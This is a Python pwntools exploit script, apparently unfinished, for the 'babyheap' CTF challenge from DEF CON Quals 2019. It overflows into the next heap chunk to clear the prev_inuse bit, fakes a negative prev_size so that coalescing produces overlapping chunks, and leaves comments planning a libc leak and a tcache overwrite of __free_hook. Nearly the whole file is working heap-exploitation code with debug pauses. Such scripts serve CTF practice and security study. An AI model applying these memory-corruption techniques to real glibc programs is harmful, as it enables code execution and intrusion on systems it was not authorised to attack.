from pwn import *
import ctypes

def command(c):
    p.recvuntil('Command:\n>')
    p.sendline(c)

def malloc(data, size):
    command('M')
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('>')
    p.sendline(data.strip())

def free(ind):
    command('F')
    p.recvuntil('>')
    p.sendline(str(ind))

def show(ind):
    command('S')
    p.recvuntil('> ')
    p.sendline(str(ind))
    return p.recvuntil('\n---', drop=True)

    
def main():
    global p
    #p = process("./babyheap.patched", env={"LD_PRELOAD": "./libc.so"})
    p = process("./babyheap")
#    p = remote("babyheap.quals2019.oooverflow.io", 5000)



    #test 1
    offs_val = 0x40
    offset = ctypes.c_ulong(-offs_val)

    malloc('Z' * 248, 248)
    fake_chunk = 'A' * (0x40 - 0x10 - 0x8) + p64(offset.value)
    malloc(fake_chunk, len(fake_chunk))

    for i in xrange(2, 10):
        malloc('C' * 248, 248)
    
    for i in reversed(xrange(3, 10)):
        free(i)

    raw_input('freeing')
    free(0)
    raw_input('overflowing')
    #overflow into next chunk unsetting prev_in_use bit
    malloc('A' * (248 - 8) + p64(offset.value) + "\x10", 248)
    raw_input('done')

#    malloc('B' * 50, 248)

    #overlap chunks by fucking with malloc's coalescing
    free(1)
    malloc('B' * 248, 248)

    #should have B's at the beginning 
    log.info(show(2))

    
    #TODO leak libc

    '''
    malloc('AA', 1)

    #forge fake chunk inside of chunk
    malloc('AA', 1)

    for i in xrange(6):
        malloc('AA', 1)
    
    #setup tcache
    for i in xrange(2, 8):
        free(i)

    free(0)
    #overwrite prev_inuse and setup fake prev_size(negative since \x00 is not allowed)
    malloc('AA', 1)
    #"coalesce" and put offset of chunk into unsorted bin
    free(1)
    
    #malloc and overwrite tcache bk pointer into __free_hook
    '''

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        p.interactive()
        raise
